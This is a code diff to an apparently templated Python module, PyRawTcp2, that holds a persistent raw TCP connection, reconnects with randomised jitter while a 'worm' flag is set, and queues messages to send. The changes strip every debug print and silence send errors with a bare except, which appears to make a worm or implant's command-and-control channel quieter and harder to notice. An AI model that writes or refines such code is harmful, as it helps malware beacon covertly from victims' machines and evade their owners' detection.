@@ -17,7 +17,7 @@ from time import sleep
 from typing import Union
 from random import randint
 
-{% set PRT_bencode_step = 4 %}
+{% set PRT_bencode_step = 6 %}
 
 class PyRawTcp2:
     MTYPES = "conn"
@@ -64,7 +64,6 @@ class PyRawTcp2:
         self._is_conn = False
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            print("Try Conn")
             self.client.connect(self.addr)
             self._is_conn = True
             return True
@@ -75,7 +74,6 @@ class PyRawTcp2:
         while self.worm.FLAG_working:
             if self._connect():
                 self.client.settimeout(3)
-                print("Connected")
                 self._recive()
             sleep(randint(2, 6))
     
@@ -108,8 +106,8 @@ class PyRawTcp2:
             try:
                 smsg = msg.encode(self.format)
                 self.client.send(smsg)
-            except Exception as e:
-                print("ERROR send msg: ", e)
+            except:
+                pass
     
     def send_msg(self, msg: str, *args, **kwargs) -> None:
         self.input_send_msg.put(msg)
@@ -126,14 +124,12 @@ class PyRawTcp2:
         while self.worm.FLAG_working:
             too_send = self.input_send_msg.get()
             sleep(self.pause_send)
-            print("TOO SEND: ", too_send)
             if self.is_conn:
                 self._send_msg(too_send)
             else:
                 self.wait4conn()
 
     def start(self) -> None:
-        print("PyRawTcp Starting")
         work = threading.Thread(target=self.working, daemon=True)
         work.start()
         self._conn()
